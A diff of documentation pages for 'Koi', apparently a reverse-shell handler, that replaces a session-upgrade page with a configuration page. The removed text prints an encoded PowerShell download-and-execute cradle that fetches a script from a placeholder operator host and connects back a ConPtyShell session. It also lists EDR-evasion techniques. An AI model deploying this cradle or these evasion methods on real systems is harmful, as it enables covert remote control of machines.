@@ -8,13 +8,13 @@
       
       
       
-        <link rel="canonical" href="https://b3rt1ng.github.io/koi-wiki/upgrading-sessions/">
+        <link rel="canonical" href="https://b3rt1ng.github.io/koi-wiki/configuration/">
       
       
-        <link rel="prev" href="../payloads/">
+        <link rel="prev" href="../cli-reference/">
       
       
-        <link rel="next" href="../modules/">
+        <link rel="next" href="../sessions/">
       
       
         
@@ -25,7 +25,7 @@
     
     
       
-        <title>Upgrading Sessions - Koi Documentation</title>
+        <title>Configuration - Koi Documentation</title>
       
     
     
@@ -78,7 +78,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#upgrading-sessions" class="md-skip">
+        <a href="#configuration" class="md-skip">
           Skip to content
         </a>
       
@@ -113,7 +113,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              Upgrading Sessions
+              Configuration
             
           </span>
         </div>
@@ -362,10 +362,37 @@
                 
   
   
+    
   
   
-    <li class="md-nav__item">
-      <a href="../configuration/" class="md-nav__link">
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Configuration
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
         
   
   
@@ -381,6 +408,120 @@
   
 
       </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#location" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Location
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#default-values" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Default values
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#what-each-setting-controls" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        What each setting controls
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="What each setting controls">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#host-port" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        host / port
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#display_art" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        display_art
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#colors" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        colors
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#timeouts" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        timeouts
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#editing-the-config" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Editing the config
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
     </li>
   
 
@@ -446,37 +587,10 @@
                 
   
   
-    
   
   
-  
-    <li class="md-nav__item md-nav__item--active">
-      
-      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
-      
-      
-        
-      
-      
-        <label class="md-nav__link md-nav__link--active" for="__toc">
-          
-  
-  
-  <span class="md-ellipsis">
-    
-  
-    Upgrading Sessions
-  
-
-    
-  </span>
-  
-  
-
-          <span class="md-nav__icon md-icon"></span>
-        </label>
-      
-      <a href="./" class="md-nav__link md-nav__link--active">
+    <li class="md-nav__item">
+      <a href="../upgrading-sessions/" class="md-nav__link">
         
   
   
@@ -492,137 +606,6 @@
   
 
       </a>
-      
-        
-
-<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
-  
-  
-  
-    
-  
-  
-    <label class="md-nav__title" for="__toc">
-      <span class="md-nav__icon md-icon"></span>
-      Table of contents
-    </label>
-    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
-      
-        <li class="md-nav__item">
-  <a href="#for-linux" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        For Linux
-      
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#for-windows" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        For Windows
-      
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="For Windows">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#how-it-works-internally" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        How it works internally
-      
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#more-details" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        More details
-      
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="More details">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#automatic-caching" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Automatic caching
-      
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#automatic-terminal-sizing" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Automatic terminal sizing
-      
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#session-replacement" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Session replacement
-      
-    </span>
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#requirements" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Requirements
-      
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#notes" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Notes
-      
-    </span>
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-    </ul>
-  
-</nav>
-      
     </li>
   
 
@@ -966,10 +949,10 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#for-linux" class="md-nav__link">
+  <a href="#location" class="md-nav__link">
     <span class="md-ellipsis">
       
-        For Linux
+        Location
       
     </span>
   </a>
@@ -977,22 +960,33 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#for-windows" class="md-nav__link">
+  <a href="#default-values" class="md-nav__link">
     <span class="md-ellipsis">
       
-        For Windows
+        Default values
       
     </span>
   </a>
   
-    <nav class="md-nav" aria-label="For Windows">
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#what-each-setting-controls" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        What each setting controls
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="What each setting controls">
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#how-it-works-internally" class="md-nav__link">
+  <a href="#host-port" class="md-nav__link">
     <span class="md-ellipsis">
       
-        How it works internally
+        host / port
       
     </span>
   </a>
@@ -1000,22 +994,10 @@
 </li>
         
           <li class="md-nav__item">
-  <a href="#more-details" class="md-nav__link">
+  <a href="#display_art" class="md-nav__link">
     <span class="md-ellipsis">
       
-        More details
-      
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="More details">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#automatic-caching" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Automatic caching
+        display_art
       
     </span>
   </a>
@@ -1023,10 +1005,10 @@
 </li>
         
           <li class="md-nav__item">
-  <a href="#automatic-terminal-sizing" class="md-nav__link">
+  <a href="#colors" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Automatic terminal sizing
+        colors
       
     </span>
   </a>
@@ -1034,10 +1016,10 @@
 </li>
         
           <li class="md-nav__item">
-  <a href="#session-replacement" class="md-nav__link">
+  <a href="#timeouts" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Session replacement
+        timeouts
       
     </span>
   </a>
@@ -1048,31 +1030,15 @@
     </nav>
   
 </li>
-        
-          <li class="md-nav__item">
-  <a href="#requirements" class="md-nav__link">
+      
+        <li class="md-nav__item">
+  <a href="#editing-the-config" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Requirements
+        Editing the config
       
     </span>
   </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#notes" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Notes
-      
-    </span>
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
   
 </li>
       
@@ -1093,77 +1059,98 @@
 
 
 
-<h1 id="upgrading-sessions">Upgrading Sessions</h1>
-<p>Koi allows you to automatically upgrade your sessions for both Linux and Windows.</p>
-<h2 id="for-linux">For Linux</h2>
-<p>The upgrade command tries three methods in order, falling back to the next if the previous one fails or is not available:</p>
-<ol>
-<li><strong><code>script</code></strong>, spawns a PTY using the <code>script</code> utility, available on virtually every Linux system:
-   <div class="highlight"><pre><span></span><code>script<span class="w"> </span>-qc<span class="w"> </span>/bin/bash<span class="w"> </span>/dev/null
-</code></pre></div></li>
-<li><strong><code>socat</code></strong>, if <code>script</code> is absent, tries <code>socat</code> as an alternative PTY spawner.</li>
-<li><strong>Fallback</strong>, if neither is available, runs <code>/bin/bash -i</code> or <code>/bin/sh -i</code> for a basic interactive shell without full PTY support.</li>
-</ol>
-<p>After the PTY is established, Koi sets <code>TERM=xterm-256color</code>, disables history (<code>HISTSIZE=0 HISTFILESIZE=0</code>), and syncs the terminal window size.</p>
-<div class="admonition warning">
-<p class="admonition-title">Limitations</p>
-<p>If none of these commands are available, or if the shell is too restricted, the upgrade will fail or produce a degraded shell. Alternative upgrade paths are planned, see <a href="../future-updates/">Future Updates</a>.</p>
+<h1 id="configuration">Configuration</h1>
+<p>Koi reads its settings from a single JSON file, created automatically the first time you run it.</p>
+<h2 id="location">Location</h2>
+<div class="highlight"><pre><span></span><code>~/.koi/config.json
+</code></pre></div>
+<p>If the file doesn't exist yet, Koi creates it on startup, pre-filled with the built-in defaults shown below. You can then edit it to override only the values you care about — anything you omit falls back to its default.</p>
+<h2 id="default-values">Default values</h2>
+<div class="highlight"><pre><span></span><code><span class="p">{</span>
+<span class="w">    </span><span class="nt">&quot;host&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0.0.0.0&quot;</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">&quot;port&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">4010</span><span class="p">,</span>
+
+<span class="w">    </span><span class="nt">&quot;display_art&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span>
+
+<span class="w">    </span><span class="nt">&quot;colors&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nt">&quot;pumpkin&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="mi">248</span><span class="p">,</span><span class="w"> </span><span class="mi">101</span><span class="p">,</span><span class="w"> </span><span class="mi">70</span><span class="p">],</span>
+<span class="w">        </span><span class="nt">&quot;white&quot;</span><span class="p">:</span><span class="w">   </span><span class="p">[</span><span class="mi">255</span><span class="p">,</span><span class="w"> </span><span class="mi">255</span><span class="p">,</span><span class="w"> </span><span class="mi">255</span><span class="p">],</span>
+<span class="w">        </span><span class="nt">&quot;silver&quot;</span><span class="p">:</span><span class="w">  </span><span class="p">[</span><span class="mi">169</span><span class="p">,</span><span class="w"> </span><span class="mi">169</span><span class="p">,</span><span class="w"> </span><span class="mi">169</span><span class="p">],</span>
+<span class="w">        </span><span class="nt">&quot;coral&quot;</span><span class="p">:</span><span class="w">   </span><span class="p">[</span><span class="mi">235</span><span class="p">,</span><span class="w"> </span><span class="mi">111</span><span class="p">,</span><span class="w"> </span><span class="mi">92</span><span class="p">],</span>
+<span class="w">        </span><span class="nt">&quot;umber&quot;</span><span class="p">:</span><span class="w">   </span><span class="p">[</span><span class="mi">123</span><span class="p">,</span><span class="w"> </span><span class="mi">62</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">],</span>
+<span class="w">        </span><span class="nt">&quot;blue&quot;</span><span class="p">:</span><span class="w">    </span><span class="p">[</span><span class="mi">118</span><span class="p">,</span><span class="w"> </span><span class="mi">241</span><span class="p">,</span><span class="w"> </span><span class="mi">245</span><span class="p">]</span>
+<span class="w">    </span><span class="p">},</span>
+
+<span class="w">    </span><span class="nt">&quot;timeouts&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nt">&quot;exec_command&quot;</span><span class="p">:</span><span class="w">   </span><span class="mi">30</span><span class="p">,</span>
+<span class="w">        </span><span class="nt">&quot;exec_query&quot;</span><span class="p">:</span><span class="w">     </span><span class="mi">10</span><span class="p">,</span>
+<span class="w">        </span><span class="nt">&quot;upload&quot;</span><span class="p">:</span><span class="w">         </span><span class="mi">30</span><span class="p">,</span>
+<span class="w">        </span><span class="nt">&quot;download&quot;</span><span class="p">:</span><span class="w">       </span><span class="mi">300</span><span class="p">,</span>
+<span class="w">        </span><span class="nt">&quot;http_fetch&quot;</span><span class="p">:</span><span class="w">     </span><span class="mi">60</span><span class="p">,</span>
+<span class="w">        </span><span class="nt">&quot;session_detect&quot;</span><span class="p">:</span><span class="w"> </span><span class="mf">4.0</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+<h2 id="what-each-setting-controls">What each setting controls</h2>
+<h3 id="host-port"><code>host</code> / <code>port</code></h3>
+<p>Default bind address and port for the listener. These become the defaults for <code>--host</code> and <code>-p/--port</code> on the command line — pass the flag to override them for a single run, or edit the config to change them permanently.</p>
+<h3 id="display_art"><code>display_art</code></h3>
+<p>Whether the ASCII banner is printed when the listener starts. Set to <code>false</code> to skip it (useful in scripted setups or narrow terminals).</p>
+<h3 id="colors"><code>colors</code></h3>
+<p>The RGB palette used throughout the UI (prompts, banners, status messages). Each entry is a 3-value <code>[r, g, b]</code> array. You can override any subset to retheme the interface — colors you don't override keep their default values.</p>
+<h3 id="timeouts"><code>timeouts</code></h3>
+<p>Controls how long Koi waits before giving up on various operations, in seconds:</p>
+<table>
+<thead>
+<tr>
+<th>Key</th>
+<th>Default</th>
+<th>Used for</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>exec_command</code></td>
+<td><code>30</code></td>
+<td><code>exec</code> / <code>exec_stream</code> — running a full command on the remote session</td>
+</tr>
+<tr>
+<td><code>exec_query</code></td>
+<td><code>10</code></td>
+<td>Short internal queries (e.g. OS detection, <code>Test-Path</code> checks)</td>
+</tr>
+<tr>
+<td><code>upload</code></td>
+<td><code>30</code></td>
+<td>Transferring a file to the remote target</td>
+</tr>
+<tr>
+<td><code>download</code></td>
+<td><code>300</code></td>
+<td>Transferring a file from the remote target</td>
+</tr>
+<tr>
+<td><code>http_fetch</code></td>
+<td><code>60</code></td>
+<td>Downloading external tools/releases (ligolo, SharpHound, mimikatz, PEAS...)</td>
+</tr>
+<tr>
+<td><code>session_detect</code></td>
+<td><code>4.0</code></td>
+<td>Probing a fresh connection to detect its OS and shell type</td>
+</tr>
+</tbody>
+</table>
+<p>If a session is slow or the link is laggy, raising <code>exec_command</code> or <code>download</code> can help avoid premature timeouts.</p>
+<h2 id="editing-the-config">Editing the config</h2>
+<p>Just open the file in any editor and change the values you need:</p>
+<div class="highlight"><pre><span></span><code><span class="nv">$EDITOR</span><span class="w"> </span>~/.koi/config.json
+</code></pre></div>
+<p>Only override what you need to change — the rest is merged with the defaults automatically. Restart Koi for changes to take effect.</p>
+<div class="admonition note">
+<p class="admonition-title">Note</p>
+<p>If a value in the file is malformed (wrong type, corrupted JSON...), Koi silently falls back to the built-in default for that value rather than failing to start.</p>
 </div>
-<hr />
-<h2 id="for-windows">For Windows</h2>
-<p>On Windows, Koi upgrades a raw reverse shell into a fully interactive PTY-like session using <a href="https://github.com/antonioCoco/ConPtyShell">ConPtyShell by antoniococo</a>.</p>
-<p>The upgrade process is automatic and works as follows:</p>
-<ol>
-<li>Koi downloads the latest <code>Invoke-ConPtyShell.ps1</code></li>
-<li>The script is cached locally for offline reuse</li>
-<li>Koi obfuscates the PowerShell function name to reduce detections</li>
-<li>A temporary HTTP server is spawned locally</li>
-<li>The target downloads and executes the payload</li>
-<li>A new interactive ConPTY session connects back</li>
-</ol>
-<h3 id="how-it-works-internally">How it works internally</h3>
-<p>Koi launches the following kind of command on the remote host:</p>
-<div class="highlight"><pre><span></span><code><span class="n">powershell</span> <span class="n">-nop</span> <span class="n">-ep</span> <span class="n">bypass</span> <span class="n">-enc</span> <span class="p">&lt;</span><span class="n">BASE64</span><span class="p">&gt;</span>
-</code></pre></div>
-<p>The base64 payload decodes to something like:</p>
-<div class="highlight"><pre><span></span><code><span class="p">&amp;(</span><span class="s1">&#39;Invoke-&#39;</span><span class="p">+</span><span class="s1">&#39;Expression&#39;</span><span class="p">)(&amp;((</span><span class="s1">&#39;{0}{1}&#39;</span><span class="o">-f</span><span class="s1">&#39;Invoke-Web&#39;</span><span class="p">,</span><span class="s1">&#39;Request&#39;</span><span class="p">)</span> <span class="s1">&#39;http://&lt;IP&gt;:&lt;PORT&gt;/c.ps1&#39;</span> <span class="n">-UseBasicParsing</span><span class="p">));</span>
-<span class="p">&lt;</span><span class="n">OBFUSCATED_FUNCTION</span><span class="p">&gt;</span> <span class="n">-RemoteIp</span> <span class="p">&lt;</span><span class="n">IP</span><span class="p">&gt;</span> <span class="n">-RemotePort</span> <span class="p">&lt;</span><span class="n">PORT</span><span class="p">&gt;</span> <span class="n">-Rows</span> <span class="p">&lt;</span><span class="n">ROWS</span><span class="p">&gt;</span> <span class="n">-Cols</span> <span class="p">&lt;</span><span class="n">COLS</span><span class="p">&gt;</span> <span class="n">-CommandLine</span> <span class="n">powershell</span>
-</code></pre></div>
-<p>The outer command uses <code>-EncodedCommand</code> so no plaintext <code>IEX</code> or <code>IWR</code> appears on the command line. The inner payload uses randomised call obfuscation so cmdlet names are never literal strings.</p>
-<h3 id="more-details">More details</h3>
-<h4 id="automatic-caching">Automatic caching</h4>
-<p>If GitHub is unreachable, Koi automatically falls back to the locally cached version of ConPtyShell.</p>
-<h4 id="automatic-terminal-sizing">Automatic terminal sizing</h4>
-<p>The current terminal dimensions are detected automatically and passed to ConPtyShell so the remote PTY matches your local console.</p>
-<h4 id="session-replacement">Session replacement</h4>
-<p>Once the upgraded session connects back:</p>
-<ul>
-<li>The old shell is closed</li>
-<li>The new ConPTY session replaces it transparently</li>
-<li>The session ID stays identical</li>
-</ul>
-<h3 id="requirements">Requirements</h3>
-<p>The remote target must support:</p>
-<ul>
-<li>PowerShell</li>
-<li>HTTP connectivity to the operator machine</li>
-<li>Windows 10 / Windows Server 2019+ (recommended for ConPTY support)</li>
-</ul>
-<h3 id="notes">Notes</h3>
-<p>Some EDRs may still detect:</p>
-<ul>
-<li><code>powershell.exe</code></li>
-<li><code>Invoke-WebRequest</code></li>
-<li>ConPTY-related behaviours</li>
-</ul>
-<p>Koi mitigates this through several layers:</p>
-<ul>
-<li><strong><code>-EncodedCommand</code> base64 wrapping</strong> — <code>IEX</code>, <code>IWR</code>, the URL, and the function name are invisible on the command line.</li>
-<li><strong>Randomised cmdlet obfuscation</strong> — <code>Invoke-Expression</code> and <code>Invoke-WebRequest</code> are rewritten at runtime using one of three techniques (string concatenation, <code>-f</code> format string, or char-array join), chosen randomly each time.</li>
-<li><strong>Function and symbol renaming</strong> — the ConPtyShell PS1 script has all class names, method names, and the entry-point function renamed to random identifiers.</li>
-<li><strong>C# string literal replacement</strong> — known signal strings in the embedded C# source are replaced with char-array construction expressions.</li>
-<li><strong>In-memory execution</strong> — the script is never written to disk; it is fetched and executed directly via <code>IEX</code>.</li>
-</ul>
 
 
 
